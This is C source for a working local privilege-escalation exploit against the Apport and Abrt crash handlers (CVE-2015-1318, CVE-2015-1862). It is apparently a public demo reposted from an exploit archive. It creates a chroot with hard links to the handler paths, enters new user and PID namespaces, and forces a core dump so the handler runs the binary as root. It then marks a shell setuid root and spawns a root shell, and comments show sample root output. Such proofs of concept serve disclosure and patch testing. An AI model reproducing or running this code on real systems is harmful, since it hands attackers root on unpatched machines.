#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <elf.h>
#include <err.h>
#include <syslog.h>
#include <sched.h>
#include <linux/sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/auxv.h>
#include <sys/wait.h>
 
# warning this file must be compiled with -static
 
//
// Apport/Abrt Vulnerability Demo Exploit.
//
//  Apport: CVE-2015-1318
//  Abrt:   CVE-2015-1862
// 
//   -- taviso@cmpxchg8b.com, April 2015.
//
// $ gcc -static newpid.c
// $ ./a.out
// uid=0(root) gid=0(root) groups=0(root)
// sh-4.3# exit
// exit
//
// Hint: To get libc.a,
//  yum install glibc-static or apt-get install libc6-dev
//
 
int main(int argc, char **argv)
{
    int status;
    Elf32_Phdr *hdr;
    pid_t wrapper;
    pid_t init;
    pid_t subprocess;
    unsigned i;
 
    // Verify this is a static executable by checking the program headers for a
    // dynamic segment. Originally I thought just checking AT_BASE would work,
    // but that isnt reliable across many kernels.
    hdr = (void *) getauxval(AT_PHDR);
 
    // If we find any PT_DYNAMIC, then this is probably not a static binary.
    for (i = 0; i < getauxval(AT_PHNUM); i++) {
        if (hdr[i].p_type == PT_DYNAMIC) {
            errx(EXIT_FAILURE, "you *must* compile with -static");
        }
    }
 
    // If execution reached here, it looks like we're a static executable. If
    // I'm root, then we've convinced the core handler to run us, so create a
    // setuid root executable that can be used outside the chroot.
    if (getuid() == 0) {
        if (chown("sh", 0, 0) != 0)
            exit(EXIT_FAILURE);
 
        if (chmod("sh", 04755) != 0)
            exit(EXIT_FAILURE);
 
        return EXIT_SUCCESS;
    }
 
    // If I'm not root, but euid is 0, then the exploit worked and we can spawn
    // a shell and cleanup.
    if (setuid(0) == 0) {
        system("id");
        system("rm -rf exploit");
        execlp("sh", "sh", NULL);
 
        // Something went wrong.
        err(EXIT_FAILURE, "failed to spawn root shell, but exploit worked");
    }
 
    // It looks like the exploit hasn't run yet, so create a chroot.
    if (mkdir("exploit", 0755) != 0
     || mkdir("exploit/usr", 0755) != 0
     || mkdir("exploit/usr/share", 0755) != 0
     || mkdir("exploit/usr/share/apport", 0755) != 0
     || mkdir("exploit/usr/libexec", 0755) != 0) {
        err(EXIT_FAILURE, "failed to create chroot directory");
    }
 
    // Create links to the exploit locations we need.
    if (link(*argv, "exploit/sh") != 0
     || link(*argv, "exploit/usr/share/apport/apport") != 0        // Ubuntu
     || link(*argv, "exploit/usr/libexec/abrt-hook-ccpp") != 0) {  // Fedora
        err(EXIT_FAILURE, "failed to create required hard links");
    }
 
    // Create a subprocess so we don't enter the new namespace.
    if ((wrapper = fork()) == 0) {
 
        // In the child process, create a new pid and user ns. The pid
        // namespace is only needed on Ubuntu, because they check for %P != %p
        // in their core handler. On Fedora, just a user ns is sufficient.
        if (unshare(CLONE_NEWPID | CLONE_NEWUSER) != 0)
            err(EXIT_FAILURE, "failed to create new namespace");
 
        // Create a process in the new namespace.
        if ((init = fork()) == 0) {
 
            // Init (pid 1) signal handling is special, so make a subprocess to
            // handle the traps.
            if ((subprocess = fork()) == 0) {
                // Change /proc/self/root, which we can do as we're privileged
                // within the new namepace.
                if (chroot("exploit") != 0) {
                    err(EXIT_FAILURE, "chroot didnt work");
                }
 
                // Now trap to get the core handler invoked.
                __builtin_trap();
 
                // Shouldn't happen, unless user is ptracing us or something.
                err(EXIT_FAILURE, "coredump failed, were you ptracing?");
            }
 
            // If the subprocess exited with an abnormal signal, then everything worked.
            if (waitpid(subprocess, &status, 0) == subprocess)    
                return WIFSIGNALED(status)
                        ? EXIT_SUCCESS
                        : EXIT_FAILURE;
 
            // Something didn't work.
            return EXIT_FAILURE;
        }
 
        // The new namespace didn't work.
        if (waitpid(init, &status, 0) == init)
            return WIFEXITED(status) && WEXITSTATUS(status) == EXIT_SUCCESS
                    ? EXIT_SUCCESS
                    : EXIT_FAILURE;
 
        // Waitpid failure.
        return EXIT_FAILURE;
    }
 
    // If the subprocess returned sccess, the exploit probably worked, reload
    // with euid zero.
    if (waitpid(wrapper, &status, 0) == wrapper) {
        // All done, spawn root shell.
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            execl(*argv, "w00t", NULL);
        }
    }
 
    // Unknown error.
    errx(EXIT_FAILURE, "unexpected result, cannot continue");
}

# milw00rm.org [2015-04-21]